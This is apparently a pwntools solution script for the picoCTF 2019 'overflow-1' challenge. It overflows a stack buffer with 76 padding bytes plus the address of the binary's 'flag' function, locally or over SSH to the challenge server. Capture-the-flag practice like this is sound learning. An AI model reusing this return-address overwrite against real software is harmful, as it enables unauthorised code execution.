from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

# To send to remote shell, just give the script 1 parameter. E.g. python3 exploit.py hello
if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='', password='')
  sh = s.process('vuln', cwd='/problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389')
  REMOTE = True


vuln = ELF('./vuln')
flag_addr = p32(vuln.symbols['flag'])

payload = (b'a'*76) + flag_addr
print("payload is ", payload)

sh.sendlineafter(': ', payload)

sh.interactive()
